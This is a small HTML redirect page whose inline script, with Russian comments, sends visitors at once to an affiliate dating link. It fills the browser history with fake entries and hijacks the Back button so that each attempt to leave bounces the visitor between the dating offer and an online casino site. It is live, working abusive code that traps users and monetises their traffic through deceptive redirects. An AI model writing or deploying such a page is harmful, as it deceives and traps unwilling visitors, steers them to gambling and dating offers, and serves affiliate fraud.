<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Redirect</title>

<script>

const DATING = "https://tone.affomelody.com/click?pid=6350&offer_id=25";

const CASINO = "https://onlinepnpbit.com/2Vi4txHl/";

let state = 0;

function pushHistory(){
history.pushState({}, "", "#1");
history.pushState({}, "", "#2");
history.pushState({}, "", "#3");
}

window.onload = function(){

pushHistory();

// первый заход → дейтинг
location.replace(DATING);

};

window.onpopstate = function(){

pushHistory();

if(state === 0){

state = 1;

// назад → казино
location.replace(CASINO);

}else{

state = 0;

// снова назад → дейтинг
location.replace(DATING);

}

};

</script>

</head>

</body>
</html>
